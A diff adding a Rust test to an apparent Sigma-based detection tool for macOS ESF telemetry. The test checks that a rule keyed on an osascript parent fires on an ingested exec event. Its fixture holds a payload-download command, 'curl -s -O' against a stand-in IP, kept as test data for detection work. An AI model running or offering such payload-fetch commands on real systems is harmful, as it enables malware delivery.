@@ -465,6 +465,39 @@ mod tests {
     }
 
     #[test]
+    fn esf_parent_image_resolves_a_macos_parent_keyed_verdict() {
+        // ESF supplies a real ParentImage from the calling process, so a macOS
+        // rule keyed on the osascript parent fires on the ingested exec event
+        // where predictive analysis of the same command line is indeterminate.
+        let dir =
+            PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/sigma-observed-macos");
+        let index = SigmaIndex::load_dir(&dir, "macos").expect("fixtures load");
+        let kb = kb::load(kb::Platform::MacosEs).unwrap();
+        let verdict_for = |report: &Report| -> Option<String> {
+            report
+                .findings
+                .iter()
+                .find(|f| f.rule_id == "curl")
+                .and_then(|f| f.detections.iter().find_map(|d| d.verdict.clone()))
+        };
+
+        let ev = r#"{"event":{"exec":{"target":{"executable":{"path":"/usr/bin/curl"}},
+            "args":["curl","-s","-O","http://192.0.2.10/payload"]}},
+            "process":{"executable":{"path":"/usr/bin/osascript"}}}"#;
+        let ingest = crate::telemetry::parse(ev, crate::telemetry::Format::Esf).unwrap();
+        let mut observed = analyzer::analyze_telemetry(&ingest.observations, &kb);
+        enrich(&mut observed, &index, kb::Platform::MacosEs);
+        assert_eq!(verdict_for(&observed).as_deref(), Some("fires"));
+
+        let mut predicted = analyzer::analyze("curl -s -O http://192.0.2.10/payload", &kb);
+        enrich(&mut predicted, &index, kb::Platform::MacosEs);
+        assert_eq!(
+            verdict_for(&predicted).as_deref(),
+            Some("indeterminate (needs ParentImage)")
+        );
+    }
+
+    #[test]
     fn non_linux_rules_are_skipped() {
         let index = SigmaIndex::load_dir(&fixtures(), "linux").expect("fixtures load");
         // The Windows fixture is tagged T1057 but must not be indexed.
